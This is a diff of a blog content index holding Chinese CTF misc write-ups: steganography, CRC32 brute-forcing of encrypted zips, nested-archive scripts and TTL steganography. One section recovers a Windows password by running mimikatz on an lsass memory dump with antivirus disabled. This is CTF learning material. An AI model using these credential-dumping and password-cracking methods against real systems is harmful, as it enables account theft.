@@ -255,98 +255,6 @@
       </tags>
   </entry>
   <entry>
-    <title>buu-6</title>
-    <url>/2021/07/19/buu-6/</url>
-    <content><![CDATA[<h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h1><p>跟流量包逐渐熟悉起来，感觉这个包的信息挺多</p>
-<p><img src="/2021/07/19/buu-6/image-20210719212634015.png"></p>
-<p>导出就对了（毕竟搜flag、john啥也没搜到）图片好几张，先观察一下</p>
-<p><img src="/2021/07/19/buu-6/image-20210719212935554.png"></p>
-<p>logo.png中间缺了一条</p>
-<p><img src="/2021/07/19/buu-6/image-20210719213145620.png"></p>
-<p>scanline？？？但是这张图是空的，难道拼起来？？？</p>
-<p>stegosolve先打开logo然后和scanline拼起来，啊这，啥也没有，那换过来试试</p>
-<p>好家伙，金色传说，flag有了</p>
-<p><img src="/2021/07/19/buu-6/image-20210719213533992.png"></p>
-<h1 id="WUSTCTF2020-爬"><a href="#WUSTCTF2020-爬" class="headerlink" title="[WUSTCTF2020]爬"></a>[WUSTCTF2020]爬</h1><p>我一定要来吐槽一下这道题，把覆盖flag的图片和flag图片组合在一起，真的没想到</p>
-<h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><p>这，这么多</p>
-<p><img src="/2021/07/19/buu-6/image-20210719214222876.png"></p>
-<p>每一个文件还都一样大，难道crc32碰撞？（略有耳闻，倒是第一次碰到）</p>
-<p><img src="/2021/07/19/buu-6/image-20210719214758889.png"></p>
-<p>打开一个看看，加密了，那应该是了</p>
-<p>先研究一下原理<a href="https://preshing.com/20110504/hash-collision-probabilities/">https://preshing.com/20110504/hash-collision-probabilities/</a></p>
-<p><a href="https://blog.csdn.net/zz_Caleb/article/details/88852078">https://blog.csdn.net/zz_Caleb/article/details/88852078</a></p>
-<p>CRC32:CRC本身是“<a href="http://baike.baidu.com/item/CRC32">冗余校验码</a>”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。</p>
-<p>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容</p>
-<p>（来看一点看得懂的）</p>
-<p>拿脚本跑吧</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackCrc</span>(<span class="hljs-params">crc</span>):</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>			<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>				<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> dic:<br>					s = i + j + k + h<br>					<span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode())):<br>						f.write(s)<br>						<span class="hljs-keyword">return</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackZip</span>():</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">68</span>):<br>		file = <span class="hljs-string">&#x27;out&#x27;</span>+str(i)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>		crc = zipfile.ZipFile(file,<span class="hljs-string">&#x27;r&#x27;</span>).getinfo(<span class="hljs-string">&#x27;data.txt&#x27;</span>).CRC<br>		CrackCrc(crc)<br>		print(<span class="hljs-string">&#x27;\r&#x27;</span>+<span class="hljs-string">&quot;loading：&#123;:%&#125;&quot;</span>.format(float((i+<span class="hljs-number">1</span>)/<span class="hljs-number">68</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>dic = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;+/=&#x27;</span><br>f = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>print(<span class="hljs-string">&quot;\nCRC32begin&quot;</span>)<br>CrackZip()<br>print(<span class="hljs-string">&quot;CRC32finished&quot;</span>)<br>f.close()<br><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>base64_text = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>byte_stream = base64.b64decode(base64_text)<br>open(<span class="hljs-string">&#x27;new.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(byte_stream)<br><br></code></pre></td></tr></table></figure>
-
-<p>解开是缺失文件头的rar压缩包，补上文件头后，flag在备注里。</p>
-<h1 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h1><p>iso文件，用记事本打开，发现是rar压缩包，同时有一堆和flag相关的文件</p>
-<p><img src="/2021/07/19/buu-6/image-20210720130343139.png"></p>
-<p><img src="/2021/07/19/buu-6/image-20210720131008264.png"></p>
-<p>运行一下收获一个avi文件，但是根本打不开，010查看完发现全是f<del>（脸黑</del></p>
-<p>不如re一下那个副本程序？</p>
-<p>等等怎么解压完程序显示不出来</p>
-<p><img src="/2021/07/19/buu-6/image-20210720165626002.png"></p>
-<p>原来如此，不过不影响ida使用，六十多个副本不会要我一个个看过去吧。。。。。。</p>
-<p><img src="/2021/07/19/buu-6/image-20210720170624053.png"></p>
-<p>好家伙，搜就完事</p>
-<p><img src="/2021/07/19/buu-6/image-20210720170658687.png"></p>
-<h1 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h1><p>两种汉字编码方式</p>
-<p><img src="/2021/07/19/buu-6/image-20210720172642126.png"></p>
-<p>数字的是中文电码，字母的是五笔输入法</p>
-<h1 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h1><p>前面还挺顺利的，解出base，然后以为是flag，反复提交，发现不太对劲，少利用了一张图，outguess隐写，killerqueen是解密密码</p>
-<h1 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h1><p>前面正常爆破，伪加密还行，说说最后一步</p>
-<p><img src="/2021/07/19/buu-6/image-20210720193757935.png"></p>
-<p>过了很久很久我才意识到，出题人用时间轴加密，这个也是个爆破，再根据比赛时间推算了一下时间戳大概开头，用掩码爆破</p>
-<p><img src="/2021/07/19/buu-6/image-20210720194011184.png"></p>
-<h1 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h1><p>我还真以为flag会在一张图里，结果在两张的图里。</p>
-<p>先是直接在流量包搜索flag{找到了前面一半，后面找到了在90（1）.jpg里，发现他写在备注里，然后搜索adobe，获得后半段flag（因为前半段flag和adobe段挺近的？<del>我这什么清奇的思路</del></p>
-<h1 id="MRCTF2020-千层套路"><a href="#MRCTF2020-千层套路" class="headerlink" title="[MRCTF2020]千层套路"></a>[MRCTF2020]千层套路</h1><p>真正的套娃，这个套娃竟然套了六百多层，sos就离谱</p>
-<p>密码就是压缩包文件名，手动解了快十个觉得事情不简单</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br>name = <span class="hljs-string">&#x27;0573&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    fz.extractall(pwd=bytes(name, <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    name = fz.filelist[<span class="hljs-number">0</span>].filename[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    fz.close()<br><br></code></pre></td></tr></table></figure>
-
-<p>解出来一个qr.zip里有个qr.txt，看来二维码得自己画了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>x = y = <span class="hljs-number">200</span><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(x,y))<br>file = open(<span class="hljs-string">&#x27;qr.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,x):<br>    <span class="hljs-keyword">for</span> height <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,y):<br>        line = file.readline()<br>        rgb = line.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        img.putpixel((width,height),(int(rgb[<span class="hljs-number">0</span>]),int(rgb[<span class="hljs-number">1</span>]),int(rgb[<span class="hljs-number">2</span>])))<br>img.save(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure>
-
-<h1 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h1><p>在流量包里找到flag.txt的压缩包，但是压缩包加密了</p>
-<p><img src="/2021/07/19/buu-6/image-20210721144042759.png"></p>
-<p>难道是要密码？上网学习ing</p>
-<p>在网上学习了一番后，知道了这是通过获取用户密码来解开压缩包</p>
-<p>用到mimikatz获取明文密码，现在又需要lsass.dmp这个进程的内存</p>
-<p>lsass是<a href="http://d.hatena.ne.jp/keyword/windows">windows</a>系统的一个进程，用于本地安全和登陆策略。</p>
-<p>导出lsass.dmp文件</p>
-<p>尝试使用mimikatz，很奇怪，怎么都打不开，各种打不开，各种拒绝访问，几个小时过去了，在确定自己的用户为管理员之后，把所有的杀毒软件关掉后，用管理员运行模式打开，<img src="/2021/07/19/buu-6/073E6641.jpg"><span class="image-caption">img</span>终于啊<img src="/2021/07/19/buu-6/image-20210721234435678.png"><span class="image-caption">image-20210721234435678</span></p>
-<p>debug检查一下</p>
-<p><img src="/2021/07/19/buu-6/image-20210722001149114.png"><span class="image-caption">image-20210722001149114</span></p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/LEOGG321/1850290/o_2009181317142.png"><span class="image-caption">image-20200918211554925</span></p>
-<p><img src="/2021/07/19/buu-6/image-20210722000642035.png"><span class="image-caption">image-20210722000642035</span></p>
-<p><img src="/2021/07/19/buu-6/image-20210722000755964.png"><span class="image-caption">image-20210722000755964</span></p>
-<p>妙啊</p>
-<p>不过mimikatz有时间还是要好好研究一下的</p>
-<h1 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h1><p>很明显的base64</p>
-<p>很难想象，不同的栅栏密码解密出来的结果是不一样的，发一个能用的<a href="http://ctf.ssleye.com/railfence.html">http://ctf.ssleye.com/railfence.html</a></p>
-<p>然后凯撒移位，over</p>
-<h1 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h1><p>打开音频，惯性摩斯电码，压根没听，直接转字母，发现，我转了个寂寞，后来才知道是电话拨号（这么多年了，这个音我还是听不出来，找个程序识别吧<a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">dtmf2num下载地址</a></p>
-<p><img src="/2021/07/19/buu-6/image-20210722131151592.png"><span class="image-caption">image-20210722131151592</span></p>
-<p>难道数字就是flag？？？？</p>
-<p>不像啊，这啥，什么和数字有关？手机键盘吧，试试（啊，竟然是按键机的玩法，直接九键完全不对</p>
-<p>flag{youaremyfriends}</p>
-<p><img src="/2021/07/19/buu-6/image-20200917152757024.png"><span class="image-caption">image-20200917152757024</span></p>
-<p>笑了，改个系统时间就行</p>
-<h1 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h1><p>ctf搜不到就去搜flag，注意比赛的名称，有的时候不需要想得太复杂</p>
-<h1 id="docx"><a href="#docx" class="headerlink" title="docx"></a>docx</h1><p>docx后缀改zip，找到media，打开会发现flag相关图片</p>
-<h1 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h1><p>看图</p>
-<p><img src="/2021/07/19/buu-6/image-20210723205551997.png"><span class="image-caption">image-20210723205551997</span></p>
-]]></content>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buu-5</title>
     <url>/2021/07/14/buu-5/</url>
     <content><![CDATA[<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>我真的没点错题吗，逆向吧这波（好的题目写了。。。。。。），让我康康ida怎么用</p>
@@ -486,17 +394,180 @@
 
 <p>因为是在kali上安装，我这里montage自带了，所以就放个<a href="https://github.com/nemanja-m/gaps%E7%9A%84%E9%93%BE%E6%8E%A5">https://github.com/nemanja-m/gaps的链接</a></p>
 <p>按照步骤来就行</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Deion</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–image</td>
+<td>指向拼图的路径</td>
+</tr>
+<tr>
+<td>–size</td>
+<td>拼图块的像素尺寸</td>
+</tr>
+<tr>
+<td>–generations</td>
+<td>遗传算法的代的数量</td>
+</tr>
+<tr>
+<td>–population</td>
+<td>个体数量</td>
+</tr>
+<tr>
+<td>–verbose</td>
+<td>每一代训练结束后展示最佳结果</td>
+</tr>
+<tr>
+<td>–save</td>
+<td>将拼图还原为图像</td>
+</tr>
+</tbody></table>
+<p>可以来看看这个<a href="https://cloud.tencent.com/developer/article/1120042">https://cloud.tencent.com/developer/article/1120042</a></p>
 <h1 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h1><p><img src="/2021/07/23/buu-7/image-20210724160600568.png"><span class="image-caption">image-20210724160600568</span></p>
 <p>红色通道有图片</p>
 <p><img src="/2021/07/23/buu-7/image-20210724160641776.png"><span class="image-caption">image-20210724160641776</span></p>
 <p>压缩包密码，压缩包也在红色的图里</p>
 <p>解压缩</p>
 <p><img src="/2021/07/23/buu-7/image-20210724161018947.png"><span class="image-caption">image-20210724161018947</span></p>
-<p>感觉是rgb色块</p>
+<p>感觉是rgb色块，但是36个色块，也不可能是图片了（虽然但是，我还是去画了</p>
+<p><img src="/2021/07/23/buu-7/image-20210724162838504.png"><span class="image-caption">image-20210724162838504</span></p>
+<p>解密压缩包，得到：一个只包含127 255 63 191的TXT文件，正经解法应该是转换成二进制然后取前两位重组。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-keyword">as</span> a_file:<br>    content = [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a_file.readlines()]<span class="hljs-comment"># 去除空格</span><br>bins = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> content:<br>    bins.append(bin(int(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[:<span class="hljs-number">2</span>]) <span class="hljs-comment">#bin为转为二进制数开头为0b，这里通过[2:]来删除；zfill()返回指定长度的字符串，原字符串右对齐，前面填充0。在这里指定长度为8，取前两位</span><br>stringBins = <span class="hljs-string">&#x27;&#x27;</span>.join(bins)  <span class="hljs-comment">#将序列中的元素以指定的字符连接生成一个新的字符串。这里&#x27;&#x27;表示直接连接</span><br>num = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(int(len(stringBins)/<span class="hljs-number">8</span>)):<br>    flag+=chr(int(stringBins[num:num+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))<span class="hljs-comment">#8个数字转为一个字母，int默认十进制，这里为二进制需标注</span><br>    num+=<span class="hljs-number">8</span><br><br>print(flag)<br></code></pre></td></tr></table></figure>
+
+<p>得到rar-passwd:0ac1fe6b77be5dbe</p>
+<p><img src="/2021/07/23/buu-7/image-20210724171551913.png"><span class="image-caption">image-20210724171551913</span></p>
+<p><img src="/2021/07/23/buu-7/image-20210724171816937.png"><span class="image-caption">image-20210724171816937</span></p>
+<p>吐了，这题目</p>
+<p>这离谱的玩法</p>
+<h1 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h1><p>上一题类似的操作，不过总算知道这到底是是什么操作了  </p>
+<p>TTL隐写<a href="https://www.cnblogs.com/yunqian2017/p/14671031.html">https://www.cnblogs.com/yunqian2017/p/14671031.html</a></p>
+<h2 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减<span class="hljs-number">1</span>，当TTL为<span class="hljs-number">0</span>的时候，该报文就会被丢弃。<br>TTL所占的位数是<span class="hljs-number">8</span>位，也就是<span class="hljs-number">0</span><span class="hljs-number">-255</span>的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，<br>远远比上限<span class="hljs-number">255</span>小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br>如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的<span class="hljs-number">6</span>位设置为<span class="hljs-number">1</span>（xx111111），这样发<span class="hljs-number">4</span>个IP报文即可传送<span class="hljs-number">1</span>个字节。<br></code></pre></td></tr></table></figure>
+
+<p>因为写出来是一个压缩包的hex码，so上一题的脚本其实改一改就行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;attachment.txt&#x27;</span>) <span class="hljs-keyword">as</span> a_file:<br>    content = [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a_file.readlines()]<br>bins = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> content:<br>    bins.append(bin(int(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[:<span class="hljs-number">2</span>])<br><span class="hljs-comment">#print(bins)</span><br>stringBins = <span class="hljs-string">&#x27;&#x27;</span>.join(bins)<br>num = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(int(len(stringBins)/<span class="hljs-number">8</span>)):<br>    flag+=chr(int(stringBins[num:num+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))<br>    num+=<span class="hljs-number">8</span><br> <br>print(flag)<br>flag = binascii.unhexlify(flag)<br>wp = open(<span class="hljs-string">&#x27;ans.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>wp.write(flag)<br>wp.close()<br></code></pre></td></tr></table></figure>
+
+<p>关于binascii.unhexllify()可以看看这篇文章<a href="https://200ok.ch/posts/2018-12-09_unhexlify.html">https://200ok.ch/posts/2018-12-09_unhexlify.html</a></p>
+<p>伪加密，然后flag.txt是个base64套娃，来个脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>f=open(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>a=f.read()<br><span class="hljs-comment">#print(f,a)</span><br>res=base64.b64decode(a)<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    res=base64.b64decode(res)<br>    print(res)<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h1><p>补png文件头，flag在图上</p>
+<h1 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h1><p>题目说的这么明白了，反手就把流量包里的压缩包分离出了，尝试弱密码未果，确定是真加密，在流量包找到密码，over</p>
+<p><img src="/2021/07/23/buu-7/image-20210724221204671.png"><span class="image-caption">image-20210724221204671</span></p>
+<p>解完就行</p>
+<h1 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h1><p><img src="/2021/07/23/buu-7/image-20210724223643837.png"><span class="image-caption">image-20210724223643837</span></p>
+<p>先看文件尾，<img src="/2021/07/23/buu-7/image-20210724224008868.png"><span class="image-caption">image-20210724224008868</span></p>
+<p>目测des或aes，JM.png图片分离可以得到秘钥，用来解win-win.zip然后</p>
+<p><img src="/2021/07/23/buu-7/image-20210724224136176.png"><span class="image-caption">image-20210724224136176</span></p>
+<p>silent，好久没用了，有亿点点没想到</p>
+<h1 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h1><p>jpeg后缀，010打开发现是文本，直接搜flag，结束</p>
+<h1 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h1><p><img src="/2021/07/23/buu-7/image-20210724225503193.png"><span class="image-caption">image-20210724225503193</span></p>
+<p>真看不出来</p>
+<p><img src="/2021/07/23/buu-7/image-20210724225542091.png"><span class="image-caption">image-20210724225542091</span></p>
+<p>你看它短短长长的样子像不像莫斯，试了前面，发现分割是个问题</p>
+<p>短的换成0，长的换成1</p>
+<p><img src="/2021/07/23/buu-7/image-20210724232824574.png"><span class="image-caption">image-20210724232824574</span></p>
 ]]></content>
       <tags>
         <tag>misc</tag>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu-6</title>
+    <url>/2021/07/19/buu-6/</url>
+    <content><![CDATA[<h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h1><p>跟流量包逐渐熟悉起来，感觉这个包的信息挺多</p>
+<p><img src="/2021/07/19/buu-6/image-20210719212634015.png"></p>
+<p>导出就对了（毕竟搜flag、john啥也没搜到）图片好几张，先观察一下</p>
+<p><img src="/2021/07/19/buu-6/image-20210719212935554.png"></p>
+<p>logo.png中间缺了一条</p>
+<p><img src="/2021/07/19/buu-6/image-20210719213145620.png"></p>
+<p>scanline？？？但是这张图是空的，难道拼起来？？？</p>
+<p>stegosolve先打开logo然后和scanline拼起来，啊这，啥也没有，那换过来试试</p>
+<p>好家伙，金色传说，flag有了</p>
+<p><img src="/2021/07/19/buu-6/image-20210719213533992.png"></p>
+<h1 id="WUSTCTF2020-爬"><a href="#WUSTCTF2020-爬" class="headerlink" title="[WUSTCTF2020]爬"></a>[WUSTCTF2020]爬</h1><p>我一定要来吐槽一下这道题，把覆盖flag的图片和flag图片组合在一起，真的没想到</p>
+<h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><p>这，这么多</p>
+<p><img src="/2021/07/19/buu-6/image-20210719214222876.png"></p>
+<p>每一个文件还都一样大，难道crc32碰撞？（略有耳闻，倒是第一次碰到）</p>
+<p><img src="/2021/07/19/buu-6/image-20210719214758889.png"></p>
+<p>打开一个看看，加密了，那应该是了</p>
+<p>先研究一下原理<a href="https://preshing.com/20110504/hash-collision-probabilities/">https://preshing.com/20110504/hash-collision-probabilities/</a></p>
+<p><a href="https://blog.csdn.net/zz_Caleb/article/details/88852078">https://blog.csdn.net/zz_Caleb/article/details/88852078</a></p>
+<p>CRC32:CRC本身是“<a href="http://baike.baidu.com/item/CRC32">冗余校验码</a>”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。</p>
+<p>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容</p>
+<p>（来看一点看得懂的）</p>
+<p>拿脚本跑吧</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackCrc</span>(<span class="hljs-params">crc</span>):</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>			<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>				<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> dic:<br>					s = i + j + k + h<br>					<span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode())):<br>						f.write(s)<br>						<span class="hljs-keyword">return</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CrackZip</span>():</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">68</span>):<br>		file = <span class="hljs-string">&#x27;out&#x27;</span>+str(i)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>		crc = zipfile.ZipFile(file,<span class="hljs-string">&#x27;r&#x27;</span>).getinfo(<span class="hljs-string">&#x27;data.txt&#x27;</span>).CRC<br>		CrackCrc(crc)<br>		print(<span class="hljs-string">&#x27;\r&#x27;</span>+<span class="hljs-string">&quot;loading：&#123;:%&#125;&quot;</span>.format(float((i+<span class="hljs-number">1</span>)/<span class="hljs-number">68</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>dic = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;+/=&#x27;</span><br>f = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>print(<span class="hljs-string">&quot;\nCRC32begin&quot;</span>)<br>CrackZip()<br>print(<span class="hljs-string">&quot;CRC32finished&quot;</span>)<br>f.close()<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>base64_text = open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>byte_stream = base64.b64decode(base64_text)<br>open(<span class="hljs-string">&#x27;new.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(byte_stream)<br><br></code></pre></td></tr></table></figure>
+
+<p>解开是缺失文件头的rar压缩包，补上文件头后，flag在备注里。</p>
+<h1 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h1><p>iso文件，用记事本打开，发现是rar压缩包，同时有一堆和flag相关的文件</p>
+<p><img src="/2021/07/19/buu-6/image-20210720130343139.png"></p>
+<p><img src="/2021/07/19/buu-6/image-20210720131008264.png"></p>
+<p>运行一下收获一个avi文件，但是根本打不开，010查看完发现全是f<del>（脸黑</del></p>
+<p>不如re一下那个副本程序？</p>
+<p>等等怎么解压完程序显示不出来</p>
+<p><img src="/2021/07/19/buu-6/image-20210720165626002.png"></p>
+<p>原来如此，不过不影响ida使用，六十多个副本不会要我一个个看过去吧。。。。。。</p>
+<p><img src="/2021/07/19/buu-6/image-20210720170624053.png"></p>
+<p>好家伙，搜就完事</p>
+<p><img src="/2021/07/19/buu-6/image-20210720170658687.png"></p>
+<h1 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h1><p>两种汉字编码方式</p>
+<p><img src="/2021/07/19/buu-6/image-20210720172642126.png"></p>
+<p>数字的是中文电码，字母的是五笔输入法</p>
+<h1 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h1><p>前面还挺顺利的，解出base，然后以为是flag，反复提交，发现不太对劲，少利用了一张图，outguess隐写，killerqueen是解密密码</p>
+<h1 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h1><p>前面正常爆破，伪加密还行，说说最后一步</p>
+<p><img src="/2021/07/19/buu-6/image-20210720193757935.png"></p>
+<p>过了很久很久我才意识到，出题人用时间轴加密，这个也是个爆破，再根据比赛时间推算了一下时间戳大概开头，用掩码爆破</p>
+<p><img src="/2021/07/19/buu-6/image-20210720194011184.png"></p>
+<h1 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h1><p>我还真以为flag会在一张图里，结果在两张的图里。</p>
+<p>先是直接在流量包搜索flag{找到了前面一半，后面找到了在90（1）.jpg里，发现他写在备注里，然后搜索adobe，获得后半段flag（因为前半段flag和adobe段挺近的？<del>我这什么清奇的思路</del></p>
